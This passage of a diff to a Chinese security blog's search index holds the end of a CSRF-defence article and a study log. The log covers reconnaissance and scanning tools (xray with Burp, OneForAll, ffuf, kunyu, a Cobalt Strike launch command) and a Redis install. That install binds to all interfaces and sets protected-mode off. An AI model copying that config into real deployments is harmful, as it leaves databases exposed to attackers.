+<p>然而，这种方法并非万无一失。Referer  的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer  的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer  值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全</p>
+</blockquote>
+<p>因为服务器并不是什么时候都能取到Referer，也可以通过抓包修改进行绕过，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法</p>
+<h4 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h4><ol start="2">
+<li>添加token并验证</li>
+</ol>
+<p>一致的做法是使用一个token（<strong>Anti CSRF Token</strong>）</p>
+<p>用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅谈CSRF攻击方式</a></p>
+<p><a href="https://www.cnblogs.com/lsj-info/p/9479755.html">CSRF攻击原理以及防御方法</a></p>
+]]></content>
+      <categories>
+        <category>csrf</category>
+      </categories>
+      <tags>
+        <tag>csrf</tag>
       </tags>
   </entry>
   <entry>
@@ -1380,57 +1441,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>第二周</title>
-    <url>/2021/09/15/%E7%AC%AC%E4%BA%8C%E5%91%A8-1/</url>
-    <content><![CDATA[<h2 id="9-13"><a href="#9-13" class="headerlink" title="9.13"></a>9.13</h2><p>kali中java切换版本命令：update-alternatives  –config  java</p>
-<p>sudo update-alternatives –install “/usr/bin/java” “java” “/usr/bin/jdk1.8.0_301/bin/java” 1<br>sudo update-alternatives –install “/usr/bin/javac” “javac” “/usr/bin/jdk1.8.0_301/bin/javac” 1<br>sudo update-alternatives –install “/usr/bin/javaws” “javaws” “/usr/bin/jdk1.8.0_301/bin/javaws” 1</p>
-<p>sudo update-alternatives –set java /usr/bin/jdk1.8.0_301/bin/java<br>sudo update-alternatives –set java /usr/bin/jdk1.8.0_301/bin/java</p>
-<p>sudo update-alternatives –set javac /usr/bin/jdk1.8.0_301/bin/javac</p>
-<p>sudo update-alternatives –set javac /usr/bin/jdk1.8.0_301/bin/javac</p>
-<p>sudo update-alternatives –set javaws /usr/bin/jdk1.8.0_301/bin/javaws</p>
-<p>sudo update-alternatives –set javaws /usr/bin/jdk1.8.0_301/bin/javaws</p>
-<p>burp位置/usr/bin/burp/</p>
-<p>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
-<p>Exception in thread “main” java.lang.UnsatisfiedLinkError: /usr/bin/jdk1.8.0_301      /jre/lib/i386/libawt_xawt.so: libXext.so.6: 无法打开共享对象文件: 没有那个文件或目录</p>
-<blockquote>
-<p>这里的报错解决了，是因为/etc/profile下误删了一点代码</p>
-</blockquote>
-<p>sudo apt-get install libxtst-dev 依赖错误，安装失败</p>
-<h2 id="9-14"><a href="#9-14" class="headerlink" title="9.14"></a>9.14</h2><h3 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h3><p>HTML文件输出 –html-output xray-testphp.html</p>
-<p><code> .\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output test1.html</code></p>
-<p>开burp代理</p>
-<p><img src="https://i.loli.net/2021/09/15/EjCZmTldnzHKQUG.png" alt="image-20210914122527496"></p>
-<p>原理：在利用burpsuite抓包分析页面的时候，所有的数据都会通过Passive Scan Client插件转发到设置的本地7777端口上，也就是xray上，然后xray会自动挖掘所有转发过来的流量信息并查找到漏洞记录在html文件中。<br> 这里还可以限定转发出去的数据包类型</p>
-<h3 id="cs"><a href="#cs" class="headerlink" title="cs"></a>cs</h3><p>启动客户端<code>java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</code></p>
-<h3 id="oneforall-fuff-kunyu"><a href="#oneforall-fuff-kunyu" class="headerlink" title="oneforall+fuff+kunyu"></a>oneforall+fuff+kunyu</h3><h4 id="oneforall"><a href="#oneforall" class="headerlink" title="oneforall"></a>oneforall</h4><p>子域名扫描</p>
-<p><code>python3 oneforall.py --target 网站域名 run</code></p>
-<p>输出的文件在result目录下</p>
-<p><a href="https://blog.csdn.net/weixin_41598660/article/details/106069680">OneForAll子域名工具</a></p>
-<h4 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h4><p>网站模糊测试</p>
-<p>go环境安装</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -c https:&#x2F;&#x2F;storage.googleapis.com&#x2F;golang&#x2F;go1.8.3.linux-amd64.tar.gz</span><br><span class="line"></span><br><span class="line">#解压到&#x2F;usr&#x2F;local目录下</span><br><span class="line">tar -C &#x2F;usr&#x2F;local&#x2F; -xzvf go1.8.3.linux-amd64.tar.gz </span><br><span class="line"></span><br><span class="line">#在&#x2F;etc&#x2F;profile中配置环境变量并更新文件</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;go&#x2F;bin</span><br><span class="line">source &#x2F;etc&#x2F;profile &#x2F;&#x2F;更新</span><br><span class="line"></span><br><span class="line">go version</span><br><span class="line"></span><br><span class="line">#或者通过创建软链接的方式安装</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;ggq89&#x2F;article&#x2F;details&#x2F;82682171</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>由于go版本太低了，又重新安装了1.16</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/09/15/dkwAN5bqEPlMgoi.png" alt="image-20210915210358116"></p>
-<p>无论使用proxychains4或是直接go get都无法访问</p>
-<p>百度解决，换个代理<code>go env -w GOPROXY=https://goproxy.cn</code></p>
-<p><img src="https://i.loli.net/2021/09/15/BFVgStXjpwx6Rru.png" alt="image-20210915210528400"></p>
-<h5 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h5><p><code>ffuf -c -w /xxx/xxx/字典位置 -u http://ip/FUZZ</code></p>
-<p><a href="https://www.cnblogs.com/secxue/p/14617343.html">ffuf 基础食用指南</a>             </p>
-<p><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p>
-<h4 id="kunyu"><a href="#kunyu" class="headerlink" title="kunyu"></a>kunyu</h4><p>zoomeye命令行版，企业资产收集</p>
-<p><code>kunyu console</code></p>
-<p><img src="https://i.loli.net/2021/09/15/BiM7AWE1p62INml.png" alt="image-20210914195509396"></p>
-<p><a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a></p>
-<h4 id="proxychains-ng"><a href="#proxychains-ng" class="headerlink" title="proxychains-ng"></a>proxychains-ng</h4><p>linux中代理工具</p>
-<p><a href="https://www.cnblogs.com/yizhixue-hx/p/12819364.html">kali 安装 proxychains-ng (proxychains4)</a></p>
-<h2 id="9-15"><a href="#9-15" class="headerlink" title="9.15"></a>9.15</h2><h4 id="Redis重新安装"><a href="#Redis重新安装" class="headerlink" title="Redis重新安装"></a>Redis重新安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.11.tar.gz</span><br><span class="line">tar -zxvf redis-4.0.11.tar.gz </span><br><span class="line">cd redis-4.0.11 </span><br><span class="line">make &#x2F;&#x2F;编译</span><br><span class="line">cd src</span><br><span class="line">vim redis.conf</span><br><span class="line">#进行注释或修改以下内容</span><br><span class="line"># bind 127.0.0.1 &#x2F;&#x2F;允许所有网络访问</span><br><span class="line">protected-mode no &#x2F;&#x2F;修改运行时不受保护</span><br><span class="line">daemonize yes &#x2F;&#x2F;修改为守护进程&#x2F;后台程序</span><br><span class="line">#运行</span><br><span class="line"> .&#x2F;redis-server &#x2F;&#x2F;运行redis，</span><br><span class="line">这种方式会因为关闭页面而直接关闭，所以可以添加开机自启脚本https:&#x2F;&#x2F;www.cnblogs.com&#x2F;williamjie&#x2F;p&#x2F;9370196.html</span><br><span class="line">或者在&#x2F;etc&#x2F;profile中配置环境变量https:&#x2F;&#x2F;www.cnblogs.com&#x2F;newloft&#x2F;p&#x2F;13066862.html</span><br><span class="line"></span><br><span class="line"># 连接其他主机</span><br><span class="line">redis-cli -h ip -p port</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/09/15/O34g9PVY8BLubpE.png" alt="image-20210915204449354"></p>
-<h4 id="daili池搭建"><a href="#daili池搭建" class="headerlink" title="daili池搭建"></a>daili池搭建</h4><p><a href="https://github.com/Python3WebSpider/ProxyPool">https://github.com/Python3WebSpider/ProxyPool</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title></title>
     <url>/2021/09/15/%E7%AC%AC%E4%BA%8C%E5%91%A8/</url>
     <content><![CDATA[<h2 id="9-13"><a href="#9-13" class="headerlink" title="9.13"></a>9.13</h2><p>kali中java切换版本命令：update-alternatives  –config  java</p>
@@ -1478,6 +1488,56 @@
 <p><a href="https://www.cnblogs.com/yizhixue-hx/p/12819364.html">kali 安装 proxychains-ng (proxychains4)</a></p>
 <h2 id="9-15"><a href="#9-15" class="headerlink" title="9.15"></a>9.15</h2><h4 id="Redis重新安装"><a href="#Redis重新安装" class="headerlink" title="Redis重新安装"></a>Redis重新安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.11.tar.gz</span><br><span class="line">tar -zxvf redis-4.0.11.tar.gz </span><br><span class="line">cd redis-4.0.11 </span><br><span class="line">make &#x2F;&#x2F;编译</span><br><span class="line">cd src</span><br><span class="line">vim redis.conf</span><br><span class="line">#进行注释或修改以下内容</span><br><span class="line"># bind 127.0.0.1 &#x2F;&#x2F;允许所有网络访问</span><br><span class="line">protected-mode no &#x2F;&#x2F;修改运行时不受保护</span><br><span class="line">daemonize yes &#x2F;&#x2F;修改为守护进程&#x2F;后台程序</span><br><span class="line">#运行</span><br><span class="line"> .&#x2F;redis-server &#x2F;&#x2F;运行redis，</span><br><span class="line">这种方式会因为关闭页面而直接关闭，所以可以添加开机自启脚本https:&#x2F;&#x2F;www.cnblogs.com&#x2F;williamjie&#x2F;p&#x2F;9370196.html</span><br><span class="line">或者在&#x2F;etc&#x2F;profile中配置环境变量https:&#x2F;&#x2F;www.cnblogs.com&#x2F;newloft&#x2F;p&#x2F;13066862.html</span><br><span class="line"></span><br><span class="line"># 连接其他主机</span><br><span class="line">redis-cli -h ip -p port</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/09/15/XOIL3NGqtYKHRvp.png" alt="image-20210915204449354"></p>
+<h4 id="daili池搭建"><a href="#daili池搭建" class="headerlink" title="daili池搭建"></a>daili池搭建</h4><p><a href="https://github.com/Python3WebSpider/ProxyPool">https://github.com/Python3WebSpider/ProxyPool</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>第二周</title>
+    <url>/2021/09/15/%E7%AC%AC%E4%BA%8C%E5%91%A8-1/</url>
+    <content><![CDATA[<h2 id="9-13"><a href="#9-13" class="headerlink" title="9.13"></a>9.13</h2><p>kali中java切换版本命令：update-alternatives  –config  java</p>
+<p>sudo update-alternatives –install “/usr/bin/java” “java” “/usr/bin/jdk1.8.0_301/bin/java” 1<br>sudo update-alternatives –install “/usr/bin/javac” “javac” “/usr/bin/jdk1.8.0_301/bin/javac” 1<br>sudo update-alternatives –install “/usr/bin/javaws” “javaws” “/usr/bin/jdk1.8.0_301/bin/javaws” 1</p>
+<p>sudo update-alternatives –set java /usr/bin/jdk1.8.0_301/bin/java<br>sudo update-alternatives –set java /usr/bin/jdk1.8.0_301/bin/java</p>
+<p>sudo update-alternatives –set javac /usr/bin/jdk1.8.0_301/bin/javac</p>
+<p>sudo update-alternatives –set javac /usr/bin/jdk1.8.0_301/bin/javac</p>
+<p>sudo update-alternatives –set javaws /usr/bin/jdk1.8.0_301/bin/javaws</p>
+<p>sudo update-alternatives –set javaws /usr/bin/jdk1.8.0_301/bin/javaws</p>
+<p>burp位置/usr/bin/burp/</p>
+<p>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
+<p>Exception in thread “main” java.lang.UnsatisfiedLinkError: /usr/bin/jdk1.8.0_301      /jre/lib/i386/libawt_xawt.so: libXext.so.6: 无法打开共享对象文件: 没有那个文件或目录</p>
+<blockquote>
+<p>这里的报错解决了，是因为/etc/profile下误删了一点代码</p>
+</blockquote>
+<p>sudo apt-get install libxtst-dev 依赖错误，安装失败</p>
+<h2 id="9-14"><a href="#9-14" class="headerlink" title="9.14"></a>9.14</h2><h3 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h3><p>HTML文件输出 –html-output xray-testphp.html</p>
+<p><code> .\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output test1.html</code></p>
+<p>开burp代理</p>
+<p><img src="https://i.loli.net/2021/09/15/EjCZmTldnzHKQUG.png" alt="image-20210914122527496"></p>
+<p>原理：在利用burpsuite抓包分析页面的时候，所有的数据都会通过Passive Scan Client插件转发到设置的本地7777端口上，也就是xray上，然后xray会自动挖掘所有转发过来的流量信息并查找到漏洞记录在html文件中。<br> 这里还可以限定转发出去的数据包类型</p>
+<h3 id="cs"><a href="#cs" class="headerlink" title="cs"></a>cs</h3><p>启动客户端<code>java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</code></p>
+<h3 id="oneforall-fuff-kunyu"><a href="#oneforall-fuff-kunyu" class="headerlink" title="oneforall+fuff+kunyu"></a>oneforall+fuff+kunyu</h3><h4 id="oneforall"><a href="#oneforall" class="headerlink" title="oneforall"></a>oneforall</h4><p>子域名扫描</p>
+<p><code>python3 oneforall.py --target 网站域名 run</code></p>
+<p>输出的文件在result目录下</p>
+<p><a href="https://blog.csdn.net/weixin_41598660/article/details/106069680">OneForAll子域名工具</a></p>
+<h4 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h4><p>网站模糊测试</p>
+<h5 id="go环境安装"><a href="#go环境安装" class="headerlink" title="go环境安装"></a>go环境安装</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -c https:&#x2F;&#x2F;storage.googleapis.com&#x2F;golang&#x2F;go1.8.3.linux-amd64.tar.gz</span><br><span class="line"></span><br><span class="line">#解压到&#x2F;usr&#x2F;local目录下</span><br><span class="line">tar -C &#x2F;usr&#x2F;local&#x2F; -xzvf go1.8.3.linux-amd64.tar.gz </span><br><span class="line"></span><br><span class="line">#在&#x2F;etc&#x2F;profile中配置环境变量并更新文件</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;go&#x2F;bin</span><br><span class="line">source &#x2F;etc&#x2F;profile &#x2F;&#x2F;更新</span><br><span class="line"></span><br><span class="line">go version</span><br><span class="line"></span><br><span class="line">#或者通过创建软链接的方式安装</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;ggq89&#x2F;article&#x2F;details&#x2F;82682171</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>由于go版本太低了，又重新安装了1.16</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/09/15/dkwAN5bqEPlMgoi.png" alt="image-20210915210358116"></p>
+<p>无论使用proxychains4或是直接go get都无法访问</p>
+<p>百度解决，换个代理<code>go env -w GOPROXY=https://goproxy.cn</code></p>
+<p><img src="https://i.loli.net/2021/09/15/BFVgStXjpwx6Rru.png" alt="image-20210915210528400"></p>
+<h5 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h5><p><code>ffuf -c -w /xxx/xxx/字典位置 -u http://ip/FUZZ</code></p>
+<p><a href="https://www.cnblogs.com/secxue/p/14617343.html">ffuf 基础食用指南</a>             </p>
+<p><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p>
+<h4 id="kunyu"><a href="#kunyu" class="headerlink" title="kunyu"></a>kunyu</h4><p>zoomeye命令行版，企业资产收集</p>
+<p><code>kunyu console</code></p>
+<p><img src="https://i.loli.net/2021/09/15/BiM7AWE1p62INml.png" alt="image-20210914195509396"></p>
+<p><a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a></p>
+<h4 id="proxychains-ng"><a href="#proxychains-ng" class="headerlink" title="proxychains-ng"></a>proxychains-ng</h4><p>linux中代理工具</p>
+<p><a href="https://www.cnblogs.com/yizhixue-hx/p/12819364.html">kali 安装 proxychains-ng (proxychains4)</a></p>
+<h2 id="9-15"><a href="#9-15" class="headerlink" title="9.15"></a>9.15</h2><h4 id="Redis重新安装"><a href="#Redis重新安装" class="headerlink" title="Redis重新安装"></a>Redis重新安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.11.tar.gz</span><br><span class="line">tar -zxvf redis-4.0.11.tar.gz </span><br><span class="line">cd redis-4.0.11 </span><br><span class="line">make &#x2F;&#x2F;编译</span><br><span class="line">cd src</span><br><span class="line">vim redis.conf</span><br><span class="line">#进行注释或修改以下内容</span><br><span class="line"># bind 127.0.0.1 &#x2F;&#x2F;允许所有网络访问</span><br><span class="line">protected-mode no &#x2F;&#x2F;修改运行时不受保护</span><br><span class="line">daemonize yes &#x2F;&#x2F;修改为守护进程&#x2F;后台程序</span><br><span class="line">#运行</span><br><span class="line"> .&#x2F;redis-server &#x2F;&#x2F;运行redis，</span><br><span class="line">这种方式会因为关闭页面而直接关闭，所以可以添加开机自启脚本https:&#x2F;&#x2F;www.cnblogs.com&#x2F;williamjie&#x2F;p&#x2F;9370196.html</span><br><span class="line">或者在&#x2F;etc&#x2F;profile中配置环境变量https:&#x2F;&#x2F;www.cnblogs.com&#x2F;newloft&#x2F;p&#x2F;13066862.html</span><br><span class="line"></span><br><span class="line"># 连接其他主机</span><br><span class="line">redis-cli -h ip -p port</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/09/15/O34g9PVY8BLubpE.png" alt="image-20210915204449354"></p>
 <h4 id="daili池搭建"><a href="#daili池搭建" class="headerlink" title="daili池搭建"></a>daili池搭建</h4><p><a href="https://github.com/Python3WebSpider/ProxyPool">https://github.com/Python3WebSpider/ProxyPool</a></p>
 ]]></content>
   </entry>
